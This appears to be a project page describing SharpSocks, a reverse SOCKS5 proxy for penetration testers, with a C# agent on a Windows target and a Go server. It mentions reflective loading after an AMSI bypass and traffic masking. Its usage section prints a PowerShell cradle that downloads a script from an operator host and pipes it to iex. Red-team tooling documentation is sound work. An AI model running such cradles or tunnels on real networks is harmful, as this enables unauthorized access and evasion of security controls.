---
title: "SharpSocks"
date: 2026-04-20
draft: false
tags: ["go", "csharp"]
summary: >
  Reverse SOCKS5 proxy for offensive security. C# agent connects out to a Go server exposing a local SOCKS5 listener. AES-256 + HMAC, optional TLS wrapping.
repo: "https://github.com/forbiddenport/SharpSocks"
---

`SharpSocks` is a reverse SOCKS5 proxy composed of a C# agent that connects to the Go server component, which exposes a local SOCKS5 proxy. Traffic from SOCKS clients is tunneled through the agent to reach the target network.

## Motivation

Oftentimes during an assumed-breach penetration test on a Windows-based environment (e.g., Active Directory, network test etc.) and while operating without C2 support, I found there's a specific need to execute a reverse socks proxy; while there's various solid options, such as `https://github.com/go-gost/gost` or `https://github.com/jpillora/chisel` I needed something .NET-based that could be loaded reflectively, perhaps after an AMSI bypass.

Thus, decided to create this tool - with the C# agent component to run on the target and the server-side component coded in golang; additionally, a small option to wrap the traffic in a TLS layer is also present, as a minimal effort to "mask" (strong word) the traffic shape.

## Features

- Reverse connection: agent connects out to server, no inbound ports needed on the target
- SOCKS5 with mandatory authentication: username/password required for all proxy clients
- Encrypted tunnel: AES-256-CBC with HMAC-SHA256 (encrypt-then-MAC), PBKDF2-SHA256 key derivation
- HMAC challenge-response: pre-shared password authentication between agent and server
- TLS transport: optional TLS wrapping with auto-generated self-signed cert and SHA256 fingerprint pinning
- Reflective loading: agent is a standard .NET assembly, loadable via `Assembly.Load()`
- PowerShell loader: build produces a ready-to-use `.ps1` cradle per framework version
- Cross-platform server: static Go binaries for linux, windows, darwin (amd64 + arm64)
- .NET Framework targets: agent compiles for net452 and net472

## Building & Usage

The only requirement for building this on a *nix box is docker; the agent component is built via `mcr.microsoft.com/dotnet/sdk:8.0` for .NET 4.5.2 and 4.7.2, and the server component built with `golang:latest`.

A Makefile wrapper's also present so just running `make` should build everything cleanly, including all modern OS+ARCH combinations for the golang server.

For convenience, a PowerShell Reflective Assembly script is also generated at build-time, resulting in `dist/agent/net452/SharpSocks.ps1`.

At the very minimum, the server needs to be accessible for the agent, and should be started as:

```
$ sharpsocks-server -agent-password <pass> -socks-username <user> -socks-password <pass>
```

And the C# agent on the Windows target, with a simple PowerShell execution cradle:

```
PS C:\> (New-Object System.Net.WebClient).DownloadString("http://10.0.0.1/SharpSocks.ps1") | iex
PS C:\> [SharpSocks.Agent.Entry]::Execute("--server 10.0.0.1 --agent-password secret".Split())
```

After the connection is established, traffic should flow from the server to the agent, via something like `proxychains` configured for `socks5` with username and password authentication.

Optionally, the `-tranport tls` set for server and `--tranport tls` for the agent can be supplied to wrap the traffic in TLS; in this case, it's also recommended to specifically validate the TLS fingerprint as a defense-in-depth measure.

Repo available at [https://github.com/forbiddenport/SharpSocks](https://github.com/forbiddenport/SharpSocks) with even more information, including more build instructions, dist/artifacts output structure, and security considerations.
